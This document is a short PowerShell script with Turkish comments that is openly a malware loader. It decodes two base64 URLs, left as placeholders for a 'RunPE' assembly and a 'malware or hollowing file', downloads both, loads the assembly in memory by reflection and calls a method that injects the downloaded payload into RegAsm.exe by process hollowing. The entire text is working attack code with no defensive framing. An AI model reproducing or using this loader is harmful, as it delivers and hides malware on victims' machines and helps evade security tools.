Add-Type -AssemblyName System.Net

# Ana fonksiyon
function Main {
    # TLS 1.2'yi kullanacak şekilde güvenlik protokolünü ayarla
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

    # WebClient nesnesi oluştur
    $webClient = New-Object System.Net.WebClient

    # Base64 ile kodlanmış assembly metnini çöz ve indir
    $rawAssembly = $webClient.DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RUNPE DIRECT LINK")))

    # İkinci WebClient nesnesi oluştur
    $webClient2 = New-Object System.Net.WebClient

    # İkinci base64 kodlanmış dosya metnini çöz ve URL'ye dönüştür
    $fileLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MALWARE OR HOLLOWING FILE DIRECT LINK"))
    $address = New-Object System.Uri($fileLink)

    # Dosyayı indir
    $array6 = $webClient2.DownloadData($address)

    # Çalıştırma parametrelerini oluştur
    $parameters = @(
        "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe",
        [string]::Empty,
        $array6,
        $true
    )

    # Assembly yükleyerek sınıfın yöntemini çağır
    $assembly = [System.Reflection.Assembly]::Load($rawAssembly)
    $assembly.GetType("AE.AEdeneme").InvokeMember("AERUN", [System.Reflection.BindingFlags]::InvokeMethod, $null, $null, $parameters)
}

# Ana fonksiyonu çağır
Main
